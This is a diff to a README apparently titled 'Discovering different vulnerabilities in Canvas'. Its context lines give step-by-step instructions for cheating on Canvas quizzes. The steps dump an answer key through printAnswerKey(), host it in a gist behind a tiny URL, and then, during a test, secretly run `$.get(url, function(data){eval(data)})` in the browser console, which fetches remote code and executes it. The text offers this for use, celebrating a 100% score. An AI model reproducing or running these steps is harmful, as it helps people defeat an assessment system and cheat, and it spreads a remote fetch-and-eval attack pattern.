@@ -15,4 +15,4 @@ Discovering different vulnerabilities in Canvas
  4. Type printAnswerKey() in the javascript console and copy and paste the results of that into a [gist](gist.github.com) ........ *TODO: clarify this step and make it easier (less technical)*
  5. Map the gist url to a [tiny url](tinyurl.com) to make it easier to memorize.
  6. When taking the test, secretively open the javascript console (see keyboard shortcut above) and type `$.get('url-to-js-file', function(data){eval(data)});` replacing `url-to-js-file` with the tiny url you created previously.
- 7. Congrats, you just got 100% on your test or quiz without even looking at it!  \\\(*O*)/
+ 7. Congrats, you just got 100% on your test or quiz without even looking at it!  \\\(\*O\*)/
